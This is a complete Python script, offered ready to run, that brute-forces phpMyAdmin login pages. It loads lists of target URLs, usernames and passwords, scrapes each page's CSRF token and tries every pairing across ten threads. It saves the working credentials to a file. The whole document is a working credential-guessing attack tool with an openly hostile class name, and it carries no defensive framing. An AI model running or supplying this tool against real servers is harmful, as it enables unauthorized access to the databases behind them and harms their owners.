import requests
from lxml import etree
from queue import Queue
import threading
class FuckPhpmyadmin:
    url_list=Queue()
    user_list=[]
    pass_list=[]
    def __init__(self):
        print("Start........")
    def Load_Url(self,file,user,passx):
        files=open(file).read().split("\n")
        for file in files:
            self.url_list.put(file)
        userses=open(user).read().split("\n")
        for userx in userses:
            self.user_list.append(userx)
        passes=open(passx).read().split("\n")
        for pa in passes:
            self.pass_list.append(pa)
    def Start(self,max):
        for i in range(max):
            threading.Thread(target=self.Brute_start).start()
    def Brute_start(self):
        while not self.url_list.empty():
            url=str(self.url_list.get())
            for user in self.user_list:
                for passx in self.pass_list:
                    if self.Brute_kernel(url,user,passx)==0:
                        break

    def Brute_kernel(self,url,username,password):
        http=requests.Session()
        headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36"
        }
        xpose=http.get(url).text
        html=etree.HTML(xpose,etree.HTMLParser())
        token=html.xpath("//html//input[@name='token']//@value")[0]
        data={
                "pma_username": username,
                "pma_password": password,
                "server": "1",
                "target": "index.php",
                "token": token
        }
        res=http.post(url,data=data,headers=headers).text
        if "information_schema" in res:
            write_line="url:"+url+" | user:"+username+" | pass:"+password+" SUCCESS"
            print(write_line)
            with open("success.txt","a") as f:
                f.write(write_line+"\n")
            return 0
        else:
            pass
            return 1
instance=FuckPhpmyadmin()
instance.Load_Url("url.txt","user.txt","pass.txt")
instance.Start(10)
